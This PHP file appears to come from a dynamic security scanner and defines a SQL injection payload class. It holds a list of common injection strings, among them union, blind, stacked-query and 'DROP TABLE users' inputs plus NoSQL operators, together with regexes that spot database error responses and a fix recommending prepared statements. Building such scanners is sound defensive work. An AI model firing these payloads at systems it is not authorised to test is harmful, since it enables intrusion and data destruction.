<?php

declare(strict_types=1);

namespace BEAR\SecurityScanner\Dast\Payload;

use BEAR\SecurityScanner\VulnerabilityInterface;

/**
 * SQL Injection attack payloads
 */
final class SqlInjectionPayload implements PayloadInterface
{
    public function getName(): string
    {
        return 'SQL Injection';
    }

    /** @return string[] */
    public function getPayloads(): array
    {
        return [
            // Basic SQL injection
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            '1 OR 1=1',
            "' OR 1=1--",
            '" OR "1"="1',

            // Union-based injection
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "1' UNION SELECT 1,2,3--",

            // Error-based injection
            "' AND 1=CONVERT(int, @@version)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",

            // Time-based blind injection
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

            // Boolean-based blind injection
            "' AND 1=1--",
            "' AND 1=2--",

            // Stacked queries
            "'; DROP TABLE users--",
            '1; SELECT * FROM users--',

            // NoSQL injection (MongoDB)
            '{"\$gt": ""}',
            '{"\$ne": null}',
        ];
    }

    /** @return string[] */
    public function getSuccessPatterns(): array
    {
        return [
            // MySQL errors
            '/SQL syntax.*MySQL/i',
            '/Warning.*mysql_/i',
            '/MySQLSyntaxErrorException/i',
            '/valid MySQL result/i',
            '/mysqli_/i',

            // PostgreSQL errors
            '/PostgreSQL.*ERROR/i',
            '/Warning.*pg_/i',
            '/valid PostgreSQL result/i',
            '/Npgsql\./i',

            // SQL Server errors
            '/Driver.*SQL[\-\_\ ]*Server/i',
            '/OLE DB.*SQL Server/i',
            '/\bSQL Server\b.*Driver/i',
            '/Warning.*mssql_/i',
            '/\bSQL Server\b.*[0-9a-fA-F]{8}/i',
            '/System\.Data\.SqlClient\./i',

            // Oracle errors
            '/\bORA-[0-9]{4,5}/i',
            '/Oracle error/i',
            '/Oracle.*Driver/i',
            '/Warning.*oci_/i',
            '/Warning.*ora_/i',

            // SQLite errors
            '/SQLite\/JDBCDriver/i',
            '/SQLite\.Exception/i',
            '/System\.Data\.SQLite\.SQLiteException/i',
            '/Warning.*sqlite_/i',
            '/Warning.*SQLite3::/i',
            '/SQLITE_ERROR/i',

            // Generic SQL errors
            '/SQL error/i',
            '/SQL syntax/i',
            '/syntax error/i',
            '/unterminated quoted string/i',
            '/quoted string not properly terminated/i',
        ];
    }

    public function getSeverity(): string
    {
        return VulnerabilityInterface::SEVERITY_CRITICAL;
    }

    public function getDescription(): string
    {
        return 'SQL Injection vulnerability detected - application may be vulnerable to database manipulation';
    }

    public function getRecommendation(): string
    {
        return 'Use prepared statements with parameterized queries. Never concatenate user input into SQL queries.';
    }
}
